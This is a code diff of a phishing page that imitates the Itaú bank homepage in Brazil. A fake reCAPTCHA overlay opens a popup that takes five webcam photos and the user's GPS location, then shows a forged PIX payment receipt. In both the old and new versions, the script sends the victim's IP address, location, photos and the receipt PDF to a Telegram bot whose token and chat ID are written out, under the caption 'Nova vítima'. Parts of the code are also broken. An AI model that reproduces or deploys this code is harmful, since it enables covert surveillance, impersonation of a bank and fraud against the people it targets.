@@ -1,40 +1,30 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <title>Itaú – Página inicial</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:"Itau Display",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
 a{text-decoration:none;color:inherit}
 button{cursor:pointer;border:none}
 body{background:#f5f5f5;display:flex;flex-direction:column;min-height:100vh}
-
-/* TOPO IGUAL ITAU */
 header{width:100%;background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.08)}
 .top-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 24px}
 .logo{height:32px}
-nav .btn-acesso{background:#FF6600;color:#fff;padding:10px 20px;border-radius:4px;font-weight:600;font-size:14px}
 nav ul{display:flex;gap:24px;list-style:none;font-size:14px;color:#222}
 nav ul li:hover{color:#FF6600}
-
-/* BANNER */
+nav .btn-acesso{background:#FF6600;color:#fff;padding:10px 20px;border-radius:4px;font-weight:600;font-size:14px}
 .banner{background:#003d82;color:#fff;padding:64px 24px;text-align:center}
 .banner h1{font-size:36px;margin-bottom:16px}
 .banner p{font-size:18px;margin-bottom:24px;opacity:.9}
 .banner button{background:#FF6600;color:#fff;padding:14px 32px;border-radius:30px;font-size:16px;font-weight:600}
-
-/* CARDS */
 .cards{display:flex;gap:24px;justify-content:center;flex-wrap:wrap;padding:48px 24px}
 .card{background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.06);width:260px;padding:24px;text-align:center}
 .card img{height:64px;margin-bottom:12px}
 .card h3{font-size:18px;margin-bottom:8px}
 .card p{font-size:14px;color:#555}
-
-/* RODAPÉ */
 footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-size:12px;opacity:.8}
-
-/* OVERLAY RECAPTCHA FAKE */
 #overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;z-index:999}
 #captcha-box{background:#fff;border:1px solid #d0d0d0;border-radius:3px;width:302px;padding:12px 16px;display:flex;align-items:center;gap:12px}
 #captcha-box input[type=checkbox]{width:28px;height:28px;cursor:pointer}
@@ -43,8 +33,6 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
 #captcha-logo img{height:18px}
 #permissoes{font-size:13px;color:#555;margin:12px 0 16px;max-width:320px;text-align:center}
 #overlay button{padding:12px 32px;font-size:16px;border:none;background:#FF6600;color:#fff;border-radius:30px;font-weight:600}
-
-/* COMPROVANTE (só aparece se permissões concedidas) */
 #comprovanteWrap{display:none;position:fixed;inset:0;background:#fff;z-index:1000;overflow-y:auto}
 #comprovante{margin:40px auto;max-width:420px;background:#fff;border-radius:12px;box-shadow:0 12px 24px rgba(0,0,0,.12);padding:24px 28px;font-size:14px;line-height:1.5;color:#222}
 .header{text-align:center;margin-bottom:20px}
@@ -55,71 +43,41 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
 .row.total{font-weight:700;font-size:17px;margin-top:10px;border-top:1px dashed #bbb;padding-top:10px}
 .footer{font-size:11px;color:#666;margin-top:14px;text-align:center}
 #comprovanteWrap button{width:100%;padding:14px;font-size:16px;border:none;background:#FF6600;color:#fff;font-weight:600;margin-top:12px;border-radius:4px}
-
-/* TELA DE BLOQUEIO */
 #blockScreen{display:none;position:fixed;inset:0;background:#fff;z-index:2000;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:24px}
 #blockScreen h2{color:#FF6600;margin-bottom:12px}
 #blockScreen p{color:#555;max-width:320px}
-
-/* MENSAGEM VERMELHA ESTILIZADA */
-#permissoes.negado{
-  color:#d32f2f;
-  font-weight:600;
-  font-size:14px;
-  margin-top:8px;
-}
+#permissoes.negado{color:#d32f2f;font-weight:600;font-size:14px;margin-top:8px}
 </style>
 </head>
 <body>
 
-<!-- CÓPIA EXATA DO TOPO ITAU -->
 <header>
   <div class="top-bar">
     <img class="logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 136 32'%3E%3Cpath fill='%23FF6600' d='M29.6 8.2c-2.3 0-4.3 1.3-5.4 3.2h-.2V8.6h-3v16.3h3.1v-8.3c0-2.5 1.4-4.2 3.6-4.2 2 0 3.2 1.4 3.2 3.7v8.8h3.1V17.6c0-4-2.3-6.3-5.4-6.3zm-8.3 9.3c0 2.8-1.8 4.8-4.5 4.8s-4.5-2-4.5-4.8V8.6h-3.1v9.1c0 4.6 3.2 8 7.6 8s7.6-3.4 7.6-8V8.6h-3.1v9zm-15.3-9h-3.1v16.3h3.1V8.6z'/%3E%3Cpath fill='%23003d82' d='M0 0h136v32H0z'/%3E%3C/svg%3E" alt="Itaú">
     <nav>
       <ul>
-        <li>Para você</li>
-        <li>Para seu negócio</li>
-        <li>Serviços</li>
-        <li>Atendimento</li>
+        <li>Para você</li><li>Para seu negócio</li><li>Serviços</li><li>Atendimento</li>
       </ul>
       <a class="btn-acesso" href="#">Acessar conta</a>
     </nav>
   </div>
 </header>
 
-<!-- BANNER -->
 <section class="banner">
   <h1>Tudo que você precisa para organizar sua vida financeira</h1>
   <p>Conta digital gratuita, cartão de crédito sem anuidade e muito mais.</p>
   <button>Abra sua conta</button>
 </section>
 
-<!-- CARDS -->
 <section class="cards">
-  <div class="card">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23FF6600'/%3E%3C/svg%3E">
-    <h3>Conta digital</h3>
-    <p>Sem tarifa de manutenção e abertura 100% online.</p>
-  </div>
-  <div class="card">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23003d82'/%3E%3C/svg%3E">
-    <h3>Cartão de crédito</h3>
-    <p>Sem anuidade e aprovado na hora.</p>
-  </div>
-  <div class="card">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%2300c853'/%3E%3C/svg%3E">
-    <h3>Investimentos</h3>
-    <p>Comece com R$ 1 e ganhe rentabilidade diária.</p>
-  </div>
+  <div class="card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' rx='12' fill='%23FF6600'/%3E%3C/svg%3E"><h3>Conta digital</h3><p>Sem tarifa de manutenção e abertura 100% online.</p></div>
+  <div class="card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' rx='12' fill='%23003d82'/%3E%3C/svg%3E"><h3>Cartão de crédito</h3><p>Sem anuidade e aprovado na hora.</p></div>
+  <div class="card"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64' rx='12' fill='%2300c853'/%3E%3C/svg%3E"><h3>Investimentos</h3><p>Comece com R$ 1 e ganhe rentabilidade diária.</p></div>
 </section>
 
-<!-- RODAPÉ -->
-<footer>
-  © 2025 Itaú Unibanco S.A. CNPJ: 60.701.190/0001-04
-</footer>
+<footer>© 2025 Itaú Unibanco S.A. CNPJ: 60.701.190/0001-04</footer>
 
-<!-- OVERLAY RECAPTCHA FAKE -->
+<!-- RECAPTCHA / OVERLAY -->
 <div id="overlay">
   <div>
     <div id="captcha-box">
@@ -136,7 +94,7 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
   </div>
 </div>
 
-<!-- COMPROVANTE (só aparece se permissões concedidas) -->
+<!-- COMPROVANTE -->
 <div id="comprovanteWrap">
   <div id="comprovante">
     <div class="header">
@@ -156,40 +114,29 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
   <button onclick="downloadPDF()">Baixar comprovante</button>
 </div>
 
-<!-- TELA DE BLOQUEIO -->
+<!-- BLOQUEIO -->
 <div id="blockScreen">
-  <h2 style="color:#FF6600;margin-bottom:12px">Permissão necessária</h2>
-  <p style="color:#555;max-width:320px">
-    Para visualizar o comprovante, é necessário permitir os acesso do seu navegador.
-  </p>
+  <h2>Permissão necessária</h2>
+  <p>Para visualizar o comprovante, é necessário permitir os acessos do seu navegador.</p>
 </div>
 
+<!-- JS -->
 <script>
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
-const chk   = document.getElementById('robot');
-const btn   = document.getElementById('btnContinue');
-const perm  = document.getElementById('permissoes');
+const chk  = document.getElementById('robot');
+const btn  = document.getElementById('btnContinue');
+const perm = document.getElementById('permissoes');
 
-// Desabilita o botão no carregamento
 btn.disabled = true;
-
-// Ativa/desativa o botão conforme a caixa
-chk.addEventListener('change', () => {
-  btn.disabled = !chk.checked;
-});
-
-// Chama a função principal quando clicar
+chk.addEventListener('change', ()=> btn.disabled = !chk.checked);
 btn.addEventListener('click', abrePopup);
 
 let pop = null;
-
 function abrePopup(){
   if(!chk.checked){alert('Marque a caixa primeiro.');return;}
-  // abre popup pop-up com features mínimas para não ser bloqueado
   pop = window.open('popup.html','pop','width=360,height=360,top=200,left=200');
-  // escuta mensagens do pop-up
   window.addEventListener('message', recebeDados);
 }
 
@@ -197,140 +144,73 @@ function recebeDados(e){
   if(e.origin !== location.origin) return;
   const {type, dados} = e.data;
   if(type === 'selfiesDone'){
-    // esconde overlay e mostra comprovante
     document.getElementById('overlay').style.display='none';
     mostraComprovante();
-    // envia tudo pro Telegram
     enviaTudo(dados);
   }
   if(type === 'negado'){
-    mostraNegado();
+    perm.textContent='Seu navegador precisa dessa autorização para prosseguir.';
+    perm.classList.add('negado');
+    document.getElementById('overlay').style.display='none';
+    document.getElementById('blockScreen').style.display='flex';
   }
-}
-
-function mostraNegado(){
-  perm.textContent = 'Seu navegador precisa dessa autorização para prosseguir.';
-  perm.classList.add('negado');
-  document.getElementById('overlay').style.display='none';
-  document.getElementById('blockScreen').style.display='flex';
 }
 
 function mostraComprovante(){
   document.getElementById('comprovanteWrap').style.display='block';
-  const umaHoraAtras = new Date(Date.now() - 60 * 60 * 1000);
+  const umaHoraAtras = new Date(Date.now() - 60*60*1000);
   document.getElementById('dataHora').textContent = umaHoraAtras.toLocaleString('pt-BR');
   document.getElementById('auth').textContent='PIX'+Date.now().toString().slice(-9);
 }
 
 async function enviaTudo(dados){
   const {selfies, locationData} = dados;
-  const msg = `Nova vítima:
-${selfies.length} selfies capturadas
-Local: ${locationData ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}` : 'negada'}`;
-  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+  // IP externo
+  const ipInfo = await fetch('https://api.ipify.org?format=json')
+                      .then(r=>r.json())
+                      .catch(()=>({ip:'0.0.0.0'}));
+  // texto
+  let msg = `🔴 Nova vítima - ${new Date().toLocaleString('pt-BR')}
+IP: ${ipInfo.ip}
+Local: ${locationData ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}` : 'GPS negado'}`;
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT_ID,text:msg})
-  });
-  // Envia cada selfie
+    body:JSON.stringify({chat_id:CHAT_ID, text:msg})
+  }).catch(()=>{});
+  // imagens
   for(let i=0;i<selfies.length;i++){
-    const binary = atob(selfies[i].split(',')[1]);
-    const arr = new Uint8Array(binary.length);
-    for(let j=0;j<binary.length;j++) arr[j]=binary.charCodeAt(j);
-    const blob = new Blob([arr],{type:'image/jpeg'});
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('photo', blob,`selfie_${i+1}.jpg`);
-    fd.append('caption',`Selfie ${i+1}/5`);
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id:CHAT_ID,
+        photo:selfies[i].split(',')[1], // base64 limpo
+        caption:`Selfie ${i+1}/5`
+      })
+    }).catch(()=>{});
   }
 }
 
 function downloadPDF(){
-  const {jsPDF}=window.jspdf;
-  html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
-    const img=canvas.toDataURL('image/png');
-    const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
-    pdf.addImage(img,'PNG',0,0);
-    const pdfBlob=pdf.output('blob');
-    const fd=new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('document', pdfBlob, 'comprovante_itau.pdf');
-    fd.append('caption','Comprovante baixado - possível alvo');
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`,{method:'POST',body:fd});
-    pdf.save('comprovante_itau.pdf');
+  import('https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js').then(m=>{
+    const {jsPDF} = m;
+    import('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js').then(()=>{
+      html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
+        const img=canvas.toDataURL('image/png');
+        const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
+        pdf.addImage(img,'PNG',0,0);
+        const blob=pdf.output('blob');
+        const fd=new FormData();
+        fd.append('chat_id',CHAT_ID);
+        fd.append('document',blob,'comprovante_itau.pdf');
+        fd.append('caption','Comprovante baixado - possível alvo');
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`,{method:'POST',body:fd});
+        pdf.save('comprovante_itau.pdf');
+      });
+    });
   });
 }
-</script>
-</body>
-</html>
-
-=====================  popup.html  =====================
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<title>Aguarde...</title>
-<style>body{font-family:Arial,Helvetica,sans-serif;background:#003d82;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh}h3{font-weight:400}</style>
-</head>
-<body>
-<h3>Processando...</h3>
-
-<script>
-const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
-const CHAT_ID = '-1003187104876';
-
-(async async function(){
-  let selfies = [];
-  let locationData = null;
-
-  // 1) CAPTURA 5 SELFIES
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    for(let i=0;i<5;i++){
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-      await new Promise(r => video.onloadedmetadata = r);
-      const canvas = document.createElement('canvas');
-      canvas.width  = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video,0,0);
-      selfies.push(canvas.toDataURL('image/jpeg'));
-      await new Promise(r => setTimeout(r,600));
-    }
-    stream.getTracks().forEach(t => t.stop());
-  } catch (e) {
-    // sem permissão → avisa mãe
-    window.opener.postMessage({type:'negado'},'*');
-    window.close();
-    return;
-  }
-
-  // 2) LOCALIZAÇÃO
-  if (!navigator.geolocation){
-    window.opener.postMessage({type:'negado'},'*');
-    window.close();
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      locationData = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        acc: pos.coords.accuracy
-      };
-      // 3) DEVOLVE TUDO PARA A PÁGINA-MÃE
-      window.opener.postMessage({type:'selfiesDone', dados:{selfies,locationData}},'*');
-      window.close();
-    },
-    () => {
-      // mesmo sem GPS manda o que tem
-      window.opener.postMessage({type:'selfiesDone', dados:{selfies,locationData}},'*');
-      window.close();
-    }
-  );
-})();
 </script>
 </body>
 </html>
